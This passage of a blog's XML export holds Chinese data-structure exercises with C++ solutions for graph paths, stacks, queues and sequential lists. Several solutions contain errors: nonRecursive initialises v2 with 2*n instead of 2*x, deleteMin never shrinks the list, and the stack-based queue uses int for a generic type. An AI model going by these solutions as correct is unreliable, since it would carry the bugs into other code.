	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>VNodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> vi<span class="token punctuation">,</span> vj<span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">hasPathBFS</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> vi<span class="token punctuation">,</span> <span class="token keyword">int</span> vj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>vi <span class="token operator">==</span> vj<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>VNodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	visited<span class="token punctuation">[</span>vi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>
	q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>vi<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> curIdx <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		ArcNode<span class="token operator">*</span> arc <span class="token operator">=</span> G<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>curIdx<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>arc <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>arc<span class="token operator">-></span>verIdx <span class="token operator">==</span> vj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
				q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			arc <span class="token operator">=</span> arc<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="输出简单路径"><a href="#输出简单路径" class="headerlink" title="输出简单路径"></a>输出简单路径</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设图用邻接表表示，设计一个算法，输出从顶点 vi 到顶点 vj 的所有简单路径。</p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">printAllPathsDFS</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> graph<span class="token punctuation">,</span> <span class="token keyword">int</span> vi<span class="token punctuation">,</span> <span class="token keyword">int</span> vj<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token operator">&amp;</span> visited<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	visited<span class="token punctuation">[</span>vi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	path<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>vi<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>vi <span class="token operator">==</span> vj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> path<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> path<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		ArcNode<span class="token operator">*</span> arc <span class="token operator">=</span> graph<span class="token punctuation">.</span>VNodes<span class="token punctuation">[</span>vi<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>arc <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>arc<span class="token operator">-></span>verIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">printAllPathsDFS</span><span class="token punctuation">(</span>graph<span class="token punctuation">,</span> arc<span class="token operator">-></span>verIdx<span class="token punctuation">,</span> vj<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			arc <span class="token operator">=</span> arc<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	visited<span class="token punctuation">[</span>vi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	path<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">printAllPaths</span><span class="token punctuation">(</span>AlGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> vi<span class="token punctuation">,</span> <span class="token keyword">int</span> vj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>VNodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> path<span class="token punctuation">;</span>
	<span class="token function">printAllPathsDFS</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> vi<span class="token punctuation">,</span> vj<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 栈和队列</title>
    <url>/2023/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="判断合法序列"><a href="#判断合法序列" class="headerlink" title="判断合法序列"></a>判断合法序列</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设 I 和 O 分别表示入栈和出栈操作，栈的初态和终态均为空，入栈和出栈的操作序列可表示为仅由 I 和 O 组成的序列，可以操作的序列称为合法序列，否则称为非法序列。编写一个算法，判定所给的序列是否合法。若合法，返回 true，否则返回 false.</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isLegalSequence</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> sequence<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> iCnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sequence<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>sequence<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">++</span>iCnt<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">--</span>iCnt<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iCnt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> iCnt <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="利用栈模拟队列"><a href="#利用栈模拟队列" class="headerlink" title="利用栈模拟队列"></a>利用栈模拟队列</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>利用两个栈 s1 和 s2 来模拟一个队列，以实现队列的 3 个基本操作，包括入队，出队，判空。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span>
<span class="token keyword">class</span> <span class="token class-name">stackBasedQueue</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
    stack<span class="token operator">&lt;</span>T<span class="token operator">></span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">bool</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        s1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">bool</span> <span class="token function">pop</span><span class="token punctuation">(</span>T<span class="token operator">&amp;</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s2<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            x <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">int</span> temp <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                s1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                s2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            x <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">bool</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> s2<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="设计队列"><a href="#设计队列" class="headerlink" title="设计队列"></a>设计队列</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>请设计一个队列，要求满足：（1）初始时队列为空；（2）入队时，允许增加队列占用空间；（3）出队后，出队元素所占用的空间可重复使用，即整个队列所占用的空间只增不减；（4）入队操作和出队操作的时间复杂度始终保持为 O(1).</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span>
<span class="token keyword">struct</span> <span class="token class-name">ListNode</span> <span class="token punctuation">&#123;</span>
    T val<span class="token punctuation">;</span>
    ListNode<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">*</span> next<span class="token punctuation">;</span>
    <span class="token function">ListNode</span><span class="token punctuation">(</span>T val<span class="token punctuation">,</span> ListNode<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">*</span> next<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span>
<span class="token keyword">class</span> <span class="token class-name">designedQueue</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
    ListNode<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">*</span> front<span class="token punctuation">,</span> <span class="token operator">*</span>rear<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token function">designedQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        front <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token generic-function"><span class="token function">ListNode</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rear <span class="token operator">=</span> front<span class="token punctuation">;</span>
        rear<span class="token operator">-></span>next <span class="token operator">=</span> front<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">bool</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>front <span class="token operator">==</span> rear<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            rear<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token generic-function"><span class="token function">ListNode</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token operator">></span></span></span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> front<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        rear<span class="token operator">-></span>val <span class="token operator">=</span> val<span class="token punctuation">;</span>
        rear <span class="token operator">=</span> rear<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">bool</span> <span class="token function">pop</span><span class="token punctuation">(</span>T<span class="token operator">&amp;</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>front <span class="token operator">==</span> rear<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        x <span class="token operator">=</span> front<span class="token operator">-></span>val<span class="token punctuation">;</span>
        front <span class="token operator">=</span> front<span class="token operator">-></span>next<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="递归转非递归"><a href="#递归转非递归" class="headerlink" title="递归转非递归"></a>递归转非递归</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>利用一个栈实现以下递归函数的非递归运算：</p>
<p><img src="/2023/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/for.png"></p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">nonRecursive</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>
    stack<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> s<span class="token punctuation">;</span> <span class="token comment">// (n, val)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 状态压栈</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> v1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> v2 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> x <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> v1<span class="token punctuation">;</span>
        v1 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
        v2 <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> v2<span class="token punctuation">;</span> <span class="token comment">// 栈中剩下的唯一值</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构编程题 顺序表</title>
    <url>/2023/07/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="删除最小值"><a href="#删除最小值" class="headerlink" title="删除最小值"></a>删除最小值</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>从顺序表中删除具有最小值的元素（假设唯一）并由函数返回被删元素的值。空出的位置由最后一个元素填补，若顺序表为空，则显示出错信息并退出运行。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">deleteMin</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> minVal <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> minIdx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>minVal <span class="token operator">></span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            minVal <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            minIdx <span class="token operator">=</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    val <span class="token operator">=</span> minVal<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="逆置顺序表"><a href="#逆置顺序表" class="headerlink" title="逆置顺序表"></a>逆置顺序表</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个高效算法，将顺序表 L 的所有元素逆置，要求算法的空间复杂度为 O(1).</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>right<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除特定值的元素"><a href="#删除特定值的元素" class="headerlink" title="删除特定值的元素"></a>删除特定值的元素</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>对长度为 n 的顺序表 L，编写一个时间复杂度为 O(n)、空间复杂度为 O(1) 的算法，该算法删除线性表中的所有值为 x 的数据元素。</p>
